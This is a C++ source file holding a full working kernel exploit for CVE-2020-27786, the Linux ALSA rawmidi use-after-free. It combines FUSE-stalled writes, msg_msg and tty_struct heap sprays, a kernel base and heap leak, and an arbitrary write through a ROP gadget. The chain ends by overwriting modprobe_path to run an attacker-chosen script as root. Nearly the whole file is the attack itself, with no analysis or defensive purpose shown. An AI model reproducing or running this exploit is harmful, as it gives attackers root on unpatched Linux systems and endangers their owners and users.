#define FUSE_USE_VERSION 29
#include "kt.h"

#include <vector>
// fmt lib
#include <fmt/core.h>

// ioctl
#include <sys/stat.h>
#include <sys/ioctl.h>

// open
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
// fuse
#include <fuse.h>

// pthread_kill
#include <signal.h>

// mmap
#include <sys/mman.h>

using namespace logger;
using namespace kernel;
using namespace fmt;
using namespace pwn::msg_msg;

#define PAGE_SIZE 4096
#define SNDRV_RAWMIDI_IOCTL_PVERSION _IOR('W', 0x00, int)
#define SNDRV_RAWMIDI_IOCTL_INFO _IOR('W', 0x01, struct snd_rawmidi_info)
#define SNDRV_RAWMIDI_IOCTL_PARAMS _IOWR('W', 0x10, struct snd_rawmidi_params)
#define SNDRV_RAWMIDI_IOCTL_STATUS _IOWR('W', 0x20, struct snd_rawmidi_status)
#define SNDRV_RAWMIDI_IOCTL_DROP _IOW('W', 0x30, int)
#define SNDRV_RAWMIDI_IOCTL_DRAIN _IOW('W', 0x31, int)
#define WRITE_SIZE 0x400

// globals
uint64_t mov_prdx_rcx_ret_offset = 0xacd98d; // 0xffffffff81acd98d: mov [rdx], rcx; ret;
static int fuse_ready = 0;
static struct fuse_chan *chan;
static int mid_fd = 0;
static char *fuse_buf;
static char *write_buf;
static int qid;
uint64_t heap_leak;
uint64_t kbase = 0;
std::vector<int> sprays;
cpu_set_t pwn_cpu;
std::vector<int> total_sprays;

// rawmidi structs
struct snd_rawmidi_info
{
    unsigned int device;       /* RO/WR (control): device number */
    unsigned int subdevice;    /* RO/WR (control): subdevice number */
    int stream;                /* WR: stream */
    int card;                  /* R: card number */
    unsigned int flags;        /* SNDRV_RAWMIDI_INFO_XXXX */
    unsigned char id[64];      /* ID (user selectable) */
    unsigned char name[80];    /* name of device */
    unsigned char subname[32]; /* name of active or selected subdevice */
    unsigned int subdevices_count;
    unsigned int subdevices_avail;
    unsigned char reserved[64]; /* reserved for future use */
};

struct snd_rawmidi_params
{
    int stream;
    size_t buffer_size;                 /* queue size in bytes */
    size_t avail_min;                   /* minimum avail bytes for wakeup */
    unsigned int no_active_sensing : 1; /* do not send active sensing byte in close() */
    unsigned char reserved[16];         /* reserved for future use */
};

enum
{
    SNDRV_RAWMIDI_STREAM_OUTPUT = 0,
    SNDRV_RAWMIDI_STREAM_INPUT,
    SNDRV_RAWMIDI_STREAM_LAST = SNDRV_RAWMIDI_STREAM_INPUT,
};

// resizes runtime buffer
void resize_buffer(int fd, size_t buf_size)
{
    struct snd_rawmidi_params params = {0};
    params.stream = SNDRV_RAWMIDI_STREAM_OUTPUT;
    params.buffer_size = buf_size;
    params.avail_min = 100;
    if (ioctl(fd, SNDRV_RAWMIDI_IOCTL_PARAMS, &params) < 0)
    {
        perror("resize_buffer");
        printf("with buf_size = %lu failed\n", buf_size);
        exit(-1);
    }
}

// fuse

static int getattr_callback(const char *path, struct stat *stbuf)
{
    puts("[+] getattr_callback");
    memset(stbuf, 0, sizeof(struct stat));

    if (strcmp(path, "/pwn") == 0 || strcmp(path, "/write") == 0 || strcmp(path, "/heap") == 0)
    {
        stbuf->st_mode = S_IFREG | 0777;
        stbuf->st_nlink = 1;
        stbuf->st_size = 0x1000;
        return 0;
    }

    return -ENOENT;
}

void msg_msg_next_heap_groom(int size, int n, int type)
{
    char buffer[0x2000], recieved[0x2000];
    memset(buffer, 0, sizeof(buffer));
    memset(recieved, 0, sizeof(recieved));

    msg *message = (msg *)buffer;

    message->mtype = type;
    uint64_t *ptr = (uint64_t *)message->mtext;
    uint64_t mov_prdx_rcx_ret = kbase + mov_prdx_rcx_ret_offset; // 0xffffffff81acd98d: mov [rdx], rcx; ret;
    println("[*] mov_prdx_rcx_ret: {:#X}", mov_prdx_rcx_ret);
    for (int i = 0; i < size / 8; ++i)
    {

        ptr[i] = mov_prdx_rcx_ret; // 0xffffffff81ad464d: mov [rdx], rcx; ret;
    }

    int mqids = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
    for (int i = 0; i < n; i++)
    {
        if (msgsnd(mqids, &message, size - 0x30, 0) != 0)
            printf("[*] Error with msgsnd %d in heap_groom\n", mqids);
    }
}
static int open_callback(const char *path, struct fuse_file_info *fi)
{
    puts("[+] open_callback");
    return 0;
}
static int read_callback(const char *path,
                         char *buf, size_t size, off_t offset,
                         struct fuse_file_info *fi)
{
    puts("[+] read_callback");
    if (sched_setaffinity(0, sizeof(cpu_set_t), &pwn_cpu))
    {
        fatal("sched_setaffinity");
    }

    // Used to leak kernel address
    if (strcmp(path, "/pwn") == 0)
    {

        // msg_msg
        char buffer[0x2000], recieved[0x2000];
        memset(buffer, 0, sizeof(buffer));
        memset(recieved, 0, sizeof(recieved));

        msg *message = (msg *)buffer;

        int size = 0x1010;
        message->mtype = 1;
        memset(message->mtext, 0x41, size);

        puts("[+] trigger uaf");
        // you have to realloc before fuse
        resize_buffer(mid_fd, 0x3050);

        // allocate over old chunk;

        send_msg(qid, message, size - 0x30, 0);

        // spray shmem structures
        pwn::kmalloc_32::shm_file_data::spray(0x50);
        // memset(buffer, 0, sizeof(buffer));
        // memset(buffer, 0x41, 0x40);

        msg_header evil;
        size = 0x1400;
        memset((void *)&evil, 0, sizeof(msg_header));
        evil.ll_next = (void *)0x4141414141414141;
        evil.ll_next = (void *)0x4242424242424242;
        evil.m_type = 1;
        evil.m_ts = size;
        memset(buffer, 0, sizeof(buffer));
        memcpy(buffer, (void *)&evil, 0x20);
        // here we override the overlapped msg_msg with our own buffer
        memcpy(buf, buffer, 0x20);
        return 0x20;
    }


    if (strcmp(path, "/write") == 0)
    {
        puts("[*] fuse write");

        auto s1 = pwn::kmalloc_1024::tty_struct::spray(20);
        sprays.insert(sprays.end(), s1.begin(), s1.end());

        puts("[+] trigger uaf");
        // you have to realloc before fuse
        resize_buffer(mid_fd, 0x350);

        auto s2 = pwn::kmalloc_1024::tty_struct::spray(20);
        sprays.insert(sprays.end(), s2.begin(), s2.end());

        char tmp[0x20];

        memset(tmp, 0, 0x20);

        uint64_t *ptr = (uint64_t *)tmp;

        // it seems that first data to tty_struct is always 0x0000000100005401.
        ptr[0] = 0x0000000100005401;
        ptr[1] = 0x0;

        println("[+] heap_leak: {:#X}", heap_leak);
        if (heap_leak == 0)
            error("heap_leak is 0");

        for (int i = 2; i < 0x20 / 8; i++)
        {
            ptr[i] = heap_leak;
        }

        // debug();

        // here we override the overlapped msg_msg with our own buffer
        memcpy(buf, tmp, 0x20);
        return 0x20;
    }

    if (strcmp(path, "/heap") == 0)
    {
        // msg_msg
        char buffer[0x2000], recieved[0x2000];
        memset(buffer, 0, sizeof(buffer));
        memset(recieved, 0, sizeof(recieved));

        msg *message = (msg *)buffer;

        // crate size thats 0x1000  + 512 (0x200)
        int size = 0x1200;
        message->mtype = 1;
        memset(message->mtext, 0x41, size);

        puts("[+] trigger uaf");
        // you have to realloc before fuse
        resize_buffer(mid_fd, 0x3050);

        msg_msg_next_heap_groom(0x200, 10, 0);

        // allocate over old chunk;
        send_msg(qid, message, size - 0x30 - 0x8, 0);
        // debug();

        msg_header evil;
        size = 0x1400;
        memset((void *)&evil, 0, sizeof(msg_header));
        evil.ll_next = (void *)0x4141414141414141;
        evil.ll_next = (void *)0x4242424242424242;
        evil.m_type = 1;
        evil.m_ts = size;
        memset(buffer, 0, sizeof(buffer));
        memcpy(buffer, (void *)&evil, 0x20);
        // here we override the overlapped msg_msg with our own buffer
        memcpy(buf, buffer, 0x20);
        return 0x20;
    }

    return -ENOENT;
}

static struct fuse_operations fops = {
    .getattr = getattr_callback,
    .open = open_callback,
    .read = read_callback,
};

void *fuse_thread(void *_arg)
{
    struct fuse_args args = FUSE_ARGS_INIT(0, NULL);
    struct fuse *fuse;

    // check if fuse is already mounted
    struct stat s = {0};
    if (!stat("/tmp/test", &s))
    {
        if (S_ISDIR(s.st_mode))
        {
            if (rmdir("/tmp/test") < 0)
            {
                fatal("rmdir(\"/tmp/test\")");
            }
        }
    }

    if (mkdir("/tmp/test", 0777))
    {
        fatal("mkdir(\"/tmp/test\")");
    }

    if (!(chan = fuse_mount("/tmp/test", &args)))
        fatal("fuse_mount");

    if (!(fuse = fuse_new(chan, &args, &fops, sizeof(fops), NULL)))
    {
        fuse_unmount("/tmp/test", chan);
        fatal("fuse_new");
    }

    fuse_set_signal_handlers(fuse_get_session(fuse));
    fuse_ready = 1;

    fuse_loop_mt(fuse);

    fuse_unmount("/tmp/test", chan);
    return NULL;
}

class CVE_2020_27786
{
    // crate fuse thread
    pthread_t ftid;

public:
    LinKern kern{};

    CVE_2020_27786()
    {
        pthread_create(&ftid, NULL, fuse_thread, NULL);

        // wait for fuse to be ready
        while (!fuse_ready)
        {
        }
        info("fuse ready");
    }

    int leak_base()
    {
        int result = 0;
        // midi fd
        mid_fd = open("/dev/snd/midiC0D1", O_RDWR);

        if (mid_fd < 0)
        {
            fatal("Error opening midi device\n");
        }

        // create queue
        qid = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);

        int fuse_fd = open("/tmp/test/pwn", O_RDWR);
        fuse_buf = (char *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                                MAP_PRIVATE, fuse_fd, 0);
        if (fuse_buf == MAP_FAILED)
        {
            fatal("mmap");
        }

        resize_buffer(mid_fd, 4090);

        // trigger uaf and overlapp msg_msg
        if (write(mid_fd, fuse_buf, 0x20) == -1)
        {
            fatal("write");
        }
        // debug();

        char recieved[0x2000] = {0};
        // max size before we use msg_seg. (if we go over this we will just segfault)
        int size = 0x2000;
        // we should recv more now
        get_msg(qid, recieved, size, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);

        uint64_t init_ipc_ns = 0;
        int found_ipc_ns = 0;
        // for (int i = 0xff8 / 8; i < (0xff8 / 8) + 0x10; i++)
        for (int i = 0xf00 / 8; i < size / 8 && i < 0x1200 / 8; i++)
        {
            init_ipc_ns = *(uint64_t *)(recieved + i * 8);
            printf("[%u]: %p\n", i, (void *)init_ipc_ns);

            if ((init_ipc_ns & 0xffff) == (kern.find_sym("./kallsyms.txt", "init_ipc_ns") & 0xffff))
            {
                found_ipc_ns = 1;
                break;
            }
        }

        uint64_t kbase = 0;
        if (found_ipc_ns == 0)
        {
            printf("failed to find leak\n");
            result = -1;
            goto cleanup;
        }

        kern.calc_base("./kallsyms.txt", "init_ipc_ns", init_ipc_ns);
        info("kbase: %p", (void *)kern.base);

    cleanup:
        close(mid_fd);
        close(fuse_fd);
        return result;
    }

    int leak_kmalloc_4096()
    {
        int result = 0;
        // midi fd
        mid_fd = open("/dev/snd/midiC0D1", O_RDWR);

        if (mid_fd < 0)
        {
            printf("Error opening midi device\n");
            return 1;
        }

        // create queue
        qid = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);

        int fuse_fd = open("/tmp/test/heap", O_RDWR);
        fuse_buf = (char *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                                MAP_PRIVATE, fuse_fd, 0);
        if (fuse_buf == MAP_FAILED)
        {
            fatal("mmap");
        }

        resize_buffer(mid_fd, 4090);

        // trigger uaf and overlapp msg_msg
        if (write(mid_fd, fuse_buf, 0x20) == -1)
        {
            perror("write");
            exit(-1);
        }
        // debug();

        char recieved[0x2000] = {0};
        // max size before we use msg_seg. (if we go over this we will just segfault)
        int size = 0x1400;
        // we should recv more now
        get_msg(qid, recieved, size, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);

        uint64_t cur_addr = 0;
        uint64_t heap_leak = 0;
        // for (int i = 0xff8 / 8; i < (0xff8 / 8) + 0x10; i++)
        for (int i = 0xf00 / 8; i < size / 8; i++)
        {
            cur_addr = *(uint64_t *)(recieved + i * 8);
            printf("[%u] @ %u: %p\n", i, i * 8, (void *)cur_addr);

            // this is m_ts of next msg_msg. we want to get ll_prev
            // typedef struct
            // {
            //     void *ll_next;
            //     void *ll_prev;
            //     long m_type;
            //     size_t m_ts;
            //     void *next;
            //     void *security;
            // } msg_header;
            if (cur_addr == 0x1d0)
            {
                heap_leak = *(uint64_t *)(recieved + (i - 2) * 8);
                break;
            }
        }
        const uint64_t msg_msg_data_offset = 0xc0; // use to be 0x38 but put it in middle for higher chance
        if (heap_leak == 0)
        {
            printf("failed to find leak\n");
            result = -1;
            goto cleanup;
        }

        println("heap leak: {:#X}", heap_leak + msg_msg_data_offset);
        kern.syms["heap"] = heap_leak + msg_msg_data_offset;

    cleanup:
        close(mid_fd);
        close(fuse_fd);
        // close(write_fd);
        return result;
    }

    int arb_write(uint64_t addr, uint32_t val)
    {
        // clean prev sprays
        sprays.clear();
        // midi fd
        mid_fd = open("/dev/snd/midiC0D1", O_RDWR);

        if (mid_fd < 0)
        {
            printf("Error opening midi device\n");
            return 1;
        }

        // create queue
        qid = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);

        int fuse_fd = open("/tmp/test/write", O_RDWR);
        fuse_buf = (char *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                                MAP_PRIVATE, fuse_fd, 0);
        if (fuse_buf == MAP_FAILED)
        {
            fatal("mmap");
        }

        resize_buffer(mid_fd, 0x400);

        // trigger uaf and overlapp msg_msg
        if (write(mid_fd, fuse_buf, 0x20) == -1)
        {
            perror("write");
            exit(-1);
        }

        // trigger write
        for (auto spray : sprays)
        {
            info("spraying fd: %d", spray);
            ioctl(spray, val /*src*/, addr /*dst*/);
            total_sprays.push_back(spray);
        }

    cleanup:
        close(fuse_fd);
        return 0;
    }

    ~CVE_2020_27786()
    {
        info("cleaning up fuse");
        // exit fuse
        pthread_kill(ftid, SIGINT);
        info("cleaned up fuse");

        // clean up all the sprays
        // or else you will get a kernel panic
        // also you don't wana close it too early so we do it here
        for (auto spray : total_sprays)
        {
            close(spray);
        }
    }
};
int main()
{

    const uint64_t MAX_ATTEMPT = 0x10;
    CPU_ZERO(&pwn_cpu);
    CPU_SET(0, &pwn_cpu);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &pwn_cpu))
    {

        fatal("sched_setaffinity");
    }

    CVE_2020_27786 exp{};

    uint64_t mod_path = 0;
    char cmd[] = "/tmp/xx";

    for (int i = 0; i < MAX_ATTEMPT; i++)
    {
        if (exp.leak_base() == 0)
        {
            break;
        }
        info(format("Failed to leak base. Attempt: {}/{}", i + 1, MAX_ATTEMPT).c_str());
    }

    kbase = exp.kern.base;
    // check if path exist...
    mod_path = exp.kern.calc_sym("./kallsyms.txt", "modprobe_path");
    println("kbase: {:#X}", kbase);
    println("modprobe_path: {:#X}", mod_path);

    for (int i = 0; i < MAX_ATTEMPT; i++)
    {
        if (exp.leak_kmalloc_4096() == 0)
        {
            break;
        }
        info(format("Failed to leak heap. Attempt: {}/{}", i + 1, MAX_ATTEMPT).c_str());
    }

    heap_leak = exp.kern.syms["heap"];
    println("heap_leak: {:#X}", heap_leak);

    for (int i = 0; i < sizeof(cmd); i += 4)
    {
        for (int j = 0; j < MAX_ATTEMPT; j++)
        {
            if (exp.arb_write(mod_path + i, *(unsigned int *)&cmd[i]) == 0)
            {

                std::ifstream fs("/proc/sys/kernel/modprobe", std::ifstream::in);
                std::string path;
                std::getline(fs, path);
                std::string correct_path{cmd + i};
                // only get substring if it is long enough
                if (correct_path.size() >= 4)
                {
                    correct_path = correct_path.substr(i, i + 4);
                }

                // check if current_path size is long enough
                std::string current_path = path.substr(i);
                if (current_path.size() >= 4)
                {
                    current_path = path.substr(i, i + 4);
                }

                info(format("checking if correct path == current path: {} == {}", correct_path, current_path).c_str());

                if (correct_path == current_path)
                {
                    break;
                }
            }
            info(format("Failed to aaw32 at {}. Attempt: {}/{}", i, j + 1, MAX_ATTEMPT).c_str());
        }
    }

    pwn::modprobe_path::init("/tmp/xx", "/tmp/dummy", "/home/user/win");
    pwn::modprobe_path::trigger("/tmp/dummy", "/home/user/win");

    return 0;
}
